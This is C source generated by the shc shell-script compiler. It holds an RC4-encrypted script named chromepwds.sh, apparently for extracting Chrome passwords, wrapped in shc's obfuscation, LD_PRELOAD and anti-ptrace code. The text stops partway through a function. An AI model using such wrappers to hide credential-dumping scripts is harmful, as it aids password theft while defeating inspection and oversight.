#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -o /home/sjhadmin/bin/chromepwds -f ./chromepwds.sh 
#endif

static  char data [] = 
#define      shll_z	10
#define      shll	((&data[0]))
	"\114\357\023\104\226\044\103\242\270\036\310"
#define      tst2_z	19
#define      tst2	((&data[13]))
	"\127\211\204\105\110\204\006\201\265\175\204\352\226\211\137\355"
	"\111\171\075\337\004\165\063\075\377"
#define      xecc_z	15
#define      xecc	((&data[38]))
	"\312\332\150\277\322\020\164\067\305\323\135\251\237\175\327\274"
	"\375\046\064\042"
#define      date_z	1
#define      date	((&data[56]))
	"\167"
#define      msg2_z	19
#define      msg2	((&data[60]))
	"\121\337\320\044\375\221\256\065\000\326\234\173\124\350\124\214"
	"\354\101\065\025\101\155\165"
#define      msg1_z	65
#define      msg1	((&data[94]))
	"\352\266\135\271\015\347\057\101\044\057\233\274\366\146\215\202"
	"\023\343\163\371\252\133\155\061\333\356\307\260\000\153\361\213"
	"\203\373\172\014\223\067\027\140\122\321\101\257\165\033\135\054"
	"\243\142\262\061\303\124\365\176\323\137\067\176\324\215\037\116"
	"\173\132\345\162\151\151\175\140\147\353\153\120\152\043\224\227"
	"\034\232\271\107\112\247\352\352\343\074\312\263\262\354"
#define      chk1_z	22
#define      chk1	((&data[177]))
	"\076\371\220\367\301\236\324\251\033\350\104\144\065\172\325\204"
	"\242\210\166\027\164\365\122\013\210\114\340\277\216\005"
#define      chk2_z	19
#define      chk2	((&data[204]))
	"\020\201\203\364\352\247\153\300\033\303\000\347\012\023\311\030"
	"\200\024\204\345\220\131"
#define      pswd_z	256
#define      pswd	((&data[237]))
	"\112\166\272\064\141\235\161\053\120\043\027\277\344\367\354\211"
	"\106\232\021\120\055\327\364\310\364\155\163\270\147\231\030\156"
	"\312\230\207\363\030\031\026\330\325\227\227\271\217\204\102\325"
	"\037\124\046\114\053\033\025\037\210\211\330\360\043\360\136\355"
	"\211\346\341\241\377\370\172\325\220\021\216\037\226\321\364\265"
	"\045\033\002\121\066\030\161\277\242\111\257\305\072\016\263\303"
	"\364\224\145\364\215\337\312\035\361\130\074\207\051\061\074\116"
	"\114\077\240\202\127\021\101\372\132\361\277\224\377\162\130\364"
	"\007\275\351\224\234\263\261\215\014\356\025\065\037\121\204\154"
	"\221\044\357\351\065\061\343\220\042\242\045\042\025\175\026\034"
	"\073\000\261\327\263\143\145\277\121\172\365\161\314\171\335\136"
	"\236\314\107\324\375\052\144\040\315\211\102\343\007\131\377\102"
	"\132\261\032\016\024\200\316\146\373\303\327\310\075\265\046\333"
	"\202\156\260\200\230\024\240\146\236\343\111\246\075\111\351\227"
	"\372\004\245\017\204\163\166\200\067\116\110\164\003\157\120\205"
	"\335\000\006\165\025\246\334\263\212\046\132\307\157\103\136\152"
	"\107\004\172\314\167\360\114\257\077\225\043\331\277\357\030"
#define      rlax_z	1
#define      rlax	((&data[497]))
	"\016"
#define      opts_z	1
#define      opts	((&data[498]))
	"\265"
#define      text_z	3087
#define      text	((&data[639]))
	"\141\024\256\272\026\332\314\141\120\206\226\261\043\007\334\164"
	"\053\364\115\352\343\145\242\143\312\073\242\276\333\321\333\074"
	"\345\212\366\374\144\303\135\264\112\363\145\156\373\102\342\046"
	"\066\060\020\032\226\263\175\140\357\040\036\312\361\372\006\327"
	"\205\375\324\351\301\062\236\013\046\004\171\041\107\134\110\176"
	"\214\131\230\042\014\025\203\374\065\242\306\047\235\315\377\042"
	"\313\323\014\214\005\253\230\053\257\022\115\366\157\226\164\374"
	"\357\015\037\374\042\243\370\130\105\276\200\342\214\177\005\130"
	"\123\022\345\130\275\175\204\155\220\322\143\000\255\256\116\055"
	"\173\265\376\152\333\056\376\354\271\240\114\062\000\163\344\133"
	"\272\335\327\142\130\210\126\105\214\054\017\246\256\337\235\305"
	"\104\007\357\157\227\276\052\316\161\241\101\316\054\055\045\235"
	"\177\145\367\150\300\130\343\067\225\061\052\177\307\051\253\342"
	"\055\015\122\222\335\343\270\331\206\070\212\041\056\150\030\212"
	"\233\174\126\051\165\213\305\264\123\044\337\115\226\243\314\163"
	"\014\244\137\353\306\337\016\102\203\253\045\250\141\173\145\207"
	"\007\322\025\005\017\043\115\124\300\335\371\261\220\061\067\132"
	"\302\005\174\117\347\152\371\117\262\101\165\113\222\161\364\020"
	"\273\312\100\202\154\363\247\124\264\004\120\234\300\040\027\115"
	"\247\057\073\110\140\115\067\107\004\056\230\040\351\216\251\002"
	"\122\144\272\156\071\357\303\000\357\066\075\243\231\203\157\250"
	"\147\201\211\044\215\326\065\335\316\002\171\157\035\170\137\123"
	"\161\341\105\172\156\356\057\125\006\363\277\317\115\377\070\041"
	"\172\216\270\041\154\374\324\064\074\324\267\154\347\163\325\054"
	"\376\023\073\313\214\326\217\243\067\274\267\225\032\055\250\122"
	"\033\050\011\243\360\134\356\033\061\164\215\162\037\025\074\177"
	"\250\043\042\220\211\045\247\376\242\236\243\141\240\324\113\022"
	"\365\065\264\344\253\346\040\324\006\026\271\346\165\276\303\175"
	"\140\106\262\155\112\243\210\361\307\365\366\362\040\311\026\351"
	"\114\042\372\226\306\356\317\153\060\164\364\013\310\316\200\144"
	"\315\150\337\032\042\270\135\070\146\346\106\030\240\102\074\072"
	"\260\010\353\242\050\274\071\276\115\223\230\020\350\034\340\263"
	"\323\041\034\241\131\240\074\351\233\004\070\067\160\244\144\013"
	"\324\026\133\235\040\015\373\054\265\366\354\243\203\366\111\330"
	"\271\200\327\070\124\034\205\130\075\051\020\211\167\136\025\350"
	"\267\046\140\235\304\245\365\300\072\223\224\330\233\133\361\246"
	"\272\036\220\223\065\253\274\247\372\256\273\343\334\173\235\174"
	"\176\077\331\206\072\205\321\233\020\377\225\333\202\270\300\133"
	"\003\361\212\132\335\105\252\072\360\250\057\001\146\064\123\143"
	"\157\236\261\056\213\164\256\377\130\363\126\132\173\176\005\103"
	"\243\025\106\231\205\125\333\270\041\255\164\256\335\056\124\254"
	"\166\133\243\121\011\234\153\266\056\253\167\374\075\347\306\166"
	"\030\150\344\231\205\062\153\375\211\073\021\134\054\030\074\015"
	"\277\125\166\044\163\364\201\023\161\111\227\015\142\163\104\302"
	"\204\310\101\125\302\037\142\061\041\364\127\370\050\016\052\326"
	"\013\156\047\227\301\022\060\172\002\221\032\012\250\152\046\173"
	"\135\120\020\165\006\053\112\205\037\120\131\015\067\162\257\142"
	"\374\252\222\134\327\136\301\056\336\164\243\011\040\000\333\137"
	"\141\325\372\237\012\055\252\315\025\046\307\056\161\321\164\202"
	"\130\133\126\362\372\305\007\045\207\046\200\344\144\025\257\047"
	"\242\222\067\371\377\223\027\256\024\343\215\210\010\210\131\316"
	"\103\227\160\147\116\100\207\045\047\053\003\200\306\232\030\206"
	"\270\016\152\007\315\166\232\027\064\363\266\304\057\211\272\063"
	"\150\376\147\371\352\233\057\033\016\134\222\320\032\372\257\072"
	"\243\101\036\316\217\146\004\252\167\006\363\211\265\171\330\257"
	"\240\044\360\351\215\310\365\306\053\364\052\031\014\207\112\271"
	"\040\017\237\242\044\235\004\022\331\315\054\156\235\277\112\101"
	"\322\110\374\321\300\124\040\334\011\013\314\232\211\334\047\105"
	"\172\056\157\055\207\372\136\172\206\330\377\034\011\125\373\142"
	"\363\327\205\323\306\251\073\040\136\052\103\047\254\066\113\353"
	"\012\015\206\054\067\177\314\110\303\332\162\164\013\203\260\276"
	"\351\350\077\160\177\346\133\227\231\206\227\060\357\011\327\370"
	"\252\175\076\104\334\344\255\224\220\147\227\212\051\256\254\057"
	"\312\175\205\221\005\266\025\070\133\056\034\313\110\276\360\141"
	"\337\343\275\037\006\352\332\264\214\265\004\356\076\037\100\306"
	"\311\056\006\252\060\113\140\232\005\147\152\052\144\036\336\146"
	"\377\320\352\206\072\263\130\132\310\025\006\302\207\274\122\025"
	"\326\200\332\377\261\354\266\326\270\170\272\253\301\161\272\323"
	"\013\302\063\270\342\151\255\126\216\020\264\255\145\143\367\157"
	"\377\122\352\064\054\141\145\366\152\071\251\304\260\022\071\145"
	"\217\076\056\267\125\070\366\335\154\163\357\113\116\213\353\376"
	"\305\311\173\367\257\335\205\372\147\303\231\030\130\330\123\174"
	"\337\013\202\372\331\263\002\262\333\141\250\264\212\330\305\130"
	"\335\266\340\271\174\377\070\267\335\207\302\135\345\263\262\265"
	"\134\275\010\355\251\024\240\167\057\112\143\225\010\004\165\225"
	"\137\127\306\070\157\013\244\251\102\260\266\351\134\162\033\327"
	"\015\351\251\317\363\337\156\266\211\360\157\316\321\326\172\033"
	"\170\103\136\244\270\007\064\016\170\055\310\255\061\210\152\205"
	"\200\105\073\237\252\354\331\010\003\203\340\202\025\325\056\121"
	"\203\143\220\307\144\276\171\266\005\016\272\062\364\016\033\110"
	"\162\215\240\300\052\104\325\051\361\251\160\264\043\012\164\037"
	"\323\037\106\247\113\157\175\063\257\001\230\206\362\027\134\026"
	"\136\002\142\353\312\361\171\113\001\206\110\176\063\325\020\262"
	"\223\055\343\226\001\146\236\114\050\104\111\124\013\254\105\272"
	"\174\157\227\250\231\274\345\143\034\344\003\262\106\122\326\324"
	"\022\044\306\026\276\024\361\317\160\107\332\254\262\060\306\242"
	"\102\244\063\053\010\026\351\106\154\314\331\124\041\011\160\350"
	"\257\153\177\336\157\377\125\226\006\245\166\237\033\316\146\067"
	"\310\010\217\147\141\051\120\117\204\151\025\166\112\166\376\134"
	"\047\202\156\237\006\227\320\061\075\215\102\072\211\022\123\361"
	"\006\152\227\005\250\255\353\134\031\013\111\053\160\054\010\006"
	"\255\153\377\207\344\161\024\133\263\060\147\215\310\117\247\342"
	"\177\322\351\313\356\376\217\021\135\040\160\373\356\315\005\070"
	"\241\066\044\332\255\121\014\116\006\337\305\224\220\112\127\164"
	"\134\145\076\134\323\040\067\064\332\112\116\331\154\100\052\036"
	"\165\177\061\130\314\266\327\376\147\343\065\141\300\175\344\224"
	"\355\245\132\063\030\250\173\117\351\347\056\066\261\051\266\141"
	"\327\351\217\241\103\136\325\115\120\114\153\076\000\211\157\046"
	"\342\235\273\054\216\234\221\140\264\104\317\362\277\261\244\061"
	"\363\061\246\107\204\005\060\265\350\017\313\332\041\174\130\220"
	"\273\321\206\276\355\373\247\154\042\140\146\270\270\346\216\313"
	"\256\054\302\036\254\062\302\037\153\161\365\242\055\311\066\350"
	"\137\140\153\324\023\137\165\156\023\307\032\006\232\027\175\050"
	"\351\156\224\077\075\342\114\162\107\045\125\061\161\021\225\305"
	"\314\346\044\341\321\067\323\266\171\373\071\071\341\045\215\107"
	"\025\025\250\050\352\261\113\246\327\125\353\002\206\307\122\147"
	"\305\374\237\205\010\205\307\334\042\126\117\136\231\173\120\356"
	"\304\276\252\365\362\041\372\203\301\263\331\243\237\200\355\034"
	"\376\110\134\024\041\163\352\326\157\363\002\020\023\100\003\127"
	"\300\222\061\221\037\170\047\045\174\253\070\213\306\135\133\317"
	"\342\103\235\063\006\134\357\104\216\032\103\246\145\240\301\243"
	"\320\034\263\204\114\226\120\241\354\334\203\254\156\047\061\374"
	"\037\341\364\170\043\115\300\221\034\057\250\351\021\207\237\166"
	"\072\361\261\057\005\076\065\125\077\226\227\346\006\246\250\055"
	"\353\117\000\355\204\062\035\331\242\303\331\311\003\272\335\172"
	"\374\012\112\203\044\301\361\340\323\067\362\236\012\325\377\300"
	"\117\074\166\047\057\162\271\007\142\274\231\177\365\066\113\241"
	"\141\255\320\067\057\202\247\205\262\323\010\066\154\150\372\007"
	"\324\107\240\205\211\027\150\314\202\004\040\265\115\252\015\207"
	"\253\065\104\040\334\025\243\031\101\203\142\357\006\067\106\232"
	"\337\177\362\043\222\074\325\121\007\130\005\257\154\166\126\205"
	"\152\274\310\365\114\073\000\233\025\017\114\022\340\221\214\300"
	"\354\175\013\234\261\332\216\103\170\040\060\163\170\107\116\115"
	"\307\171\021\376\071\150\361\310\074\263\363\351\363\155\336\211"
	"\152\346\042\223\060\041\005\077\070\140\007\107\134\021\042\206"
	"\043\357\361\271\006\250\333\264\223\206\205\147\244\210\217\361"
	"\176\303\143\221\315\350\367\376\027\161\347\105\142\156\110\357"
	"\161\161\075\203\022\214\120\310\350\216\043\367\332\343\151\066"
	"\131\156\010\037\245\155\257\067\131\231\336\321\076\341\350\003"
	"\314\337\140\145\330\343\245\201\116\152\037\376\364\200\314\261"
	"\004\027\162\102\065\266\231\143\030\220\361\076\332\253\226\110"
	"\020\241\255\071\316\176\344\111\127\034\163\161\110\102\254\261"
	"\102\046\177\254\222\301\112\332\111\002\064\346\210\225\223\210"
	"\145\315\247\313\076\237\215\032\224\103\157\113\235\074\334\122"
	"\370\320\012\324\165\133\242\033\241\352\320\266\153\163\326\117"
	"\152\355\174\264\264\051\132\204\050\334\002\313\016\326\346\010"
	"\034\316\374\034\266\052\052\035\271\100\122\203\373\207\131\240"
	"\045\267\115\026\136\325\154\261\072\114\140\340\326\036\317\273"
	"\250\220\354\033\165\353\313\115\133\237\313\052\000\117\355\363"
	"\027\143\100\113\007\361\135\355\252\107\035\234\226\066\044\156"
	"\277\224\307\014\241\334\046\035\364\241\303\145\032\335\215\235"
	"\270\133\273\052\100\166\064\032\076\162\305\130\250\231\121\226"
	"\036\046\217\160\141\110\220\115\125\336\032\305\327\277\066\232"
	"\073\242\052\213\211\376\172\174\362\144\141\016\007\367\151\222"
	"\316\327\063\043\171\136\377\040\174\164\026\226\252\144\114\254"
	"\222\226\010\126\155\014\201\036\305\142\263\345\172\214\051\143"
	"\045\305\051\221\223\102\366\157\367\334\100\354\015\371\317\043"
	"\013\051\021\107\067\357\123\357\077\231\076\115\341\151\206\314"
	"\163\056\335\011\241\322\375\350\345\256\143\303\163\111\156\276"
	"\062\241\101\375\016\010\262\216\222\214\047\256\345\135\370\115"
	"\122\363\044\247\204\251\125\251\146\055\055\145\160\070\234\024"
	"\176\162\151\255\012\041\272\036\125\117\376\101\247\221\115\000"
	"\251\141\211\067\303\337\365\123\226\247\264\372\016\160\032\175"
	"\311\254\101\162\011\373\217\273\042\142\043\135\050\165\100\067"
	"\274\004\075\165\265\162\057\336\203\013\225\033\331\234\032\023"
	"\142\271\307\336\147\364\032\042\262\264\262\351\172\207\306\257"
	"\161\030\132\202\306\015\060\163\261\115\267\061\012\242\134\275"
	"\270\172\140\236\172\146\372\172\353\013\016\154\141\131\115\323"
	"\137\206\101\350\331\016\224\145\246\344\047\124\173\162\076\213"
	"\167\037\352\011\052\122\162\156\376\325\203\301\112\046\342\014"
	"\025\071\055\271\261\356\205\107\073\051\302\141\223\150\254\300"
	"\355\004\327\141\144\247\166\145\211\012\202\002\136\013\067\050"
	"\173\061\374\165\316\256\301\027\137\003\341\174\176\155\367\234"
	"\202\353\156\011\301\325\140\042\131\105\056\031\163\021\224\124"
	"\352\230\167\227\240\311\054\364\134\236\306\157\051\112\260\301"
	"\306\123\061\330\147\342\342\132\307\071\157\122\010\267\166\377"
	"\054\153\270\353\272\121\003\014\072\205\202\325\116\101\146\305"
	"\303\347\073\240\274\271\373\161\217\034\041\141\264\342\074\040"
	"\047\211\276\362\377\105\065\220\104\136\274\307\212\035\257\050"
	"\307\106\364\063\337\125\107\250\075\312\010\121\356\054\261\130"
	"\333\234\261\300\032\062\204\157\264\221\331\260\231\324\273\171"
	"\266\305\325\264\062\233\202\337\377\122\064\124\053\310\021\304"
	"\312\203\046\203\151\312\175\252\237\222\370\326\122\270\123\030"
	"\025\047\075\042\274\201\014\016\114\371\121\361\214\104\164\137"
	"\004\365\120\166\327\257\025\355\236\360\332\355\232\160\276\275"
	"\233\264\164\260\263\037\164\261\117\357\145\262\254\213\066\271"
	"\340\236\177\026\260\237\365\263\341\017\316\274\272\200\274\126"
	"\264\162\175\312\077\071\045\316\315\103\162\131\225\302\243\057"
	"\112\050\214\026\063\371\363\166\144\127\062\242\144\132\235\117"
	"\155\137\351\050\062\164\224\042\305\332\144\271\022\011\316\145"
	"\323\336\311\060\272\105\220\133\011\126\301\004\111\345\215\127"
	"\341\070\241\103\263\266\263\135\266\114\150\356\361\063\240\044"
	"\276\272\251\244\304\272\320\210\073\176\317\327\333\220\043\315"
	"\177\100\036\272\120\346\161\076\362\232\221\236\370\057\262\036"
	"\137\134\232\172\237\072\267\303\220\165\011\115\024\051\042\124"
	"\037\055\331\034\310\123\267\333\226\071\123\102\057\355\011\241"
	"\040\270\270\025\254\124\143\071\365\240\135\256\154\033\143\073"
	"\044\117\161\063\022\024\027\355\051\332\231\071\307\013\024\131"
	"\142\061\231\073\247\250\347\175\013\354\063\011\030\232\230\311"
	"\172\316\305\361\126\244\175\300\304\161\335\327\146\306\102\201"
	"\122\322\174\112\353\354\177\012\223\273\245\112\057\056\143\024"
	"\025\326\043\016\236\161\220\373\364\372\270\056\102\323\337\170"
	"\210\067\201\236\232\326\135\132\235\316\041\113\161\240\103\033"
	"\276\347\336\267\155\230\270\153\264\203\332\262\224\165\236\201"
	"\030\337\126\027\163\315\207\020\206\355\321\220\353\102\332\246"
	"\054\344\336\243\211\236\336\136\207\061\055\011\164\106\121\275"
	"\320\070\105\302\147\126\157\147\275\222\016\007\251\066\176\147"
	"\263\121\153\326\320\337\116\067\361\070\200\237\341\004\015\026"
	"\304\062\224\346\242\244\312\010\337\106\276\042\001\340\141\176"
	"\012\056\272\132\153\050\252\134\322\301\126\106\275\160\037\137"
	"\051\304\241\030\257\045\153\234\140\247\250\136\353\056\363\145"
	"\143\031\123\175\233\346\306\060\252\331\124\150\330\374\130\345"
	"\033\124\010\276\114\141\004\013\341\347\230\141\354\360\264\377"
	"\325\015\274\123\222\051\344\145\215\344\315\146\340\046\114\374"
	"\172\124\272\307\266\277\322\227\246\152\371\223\133\255\222\060"
	"\272\116\203\115\170\150\262\005\114\200\153\054\246\267\050\040"
	"\014\343\347\302\242\272\132\110\044\123\334\200\001\156\260\274"
	"\275\064\011\065\234"
#define      inlo_z	3
#define      inlo	((&data[3816]))
	"\077\377\146"
#define      lsto_z	1
#define      lsto	((&data[3819]))
	"\366"
#define      tst1_z	22
#define      tst1	((&data[3822]))
	"\002\152\161\063\237\171\123\222\256\307\272\065\055\300\367\300"
	"\315\030\363\127\027\323\322\163\041"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
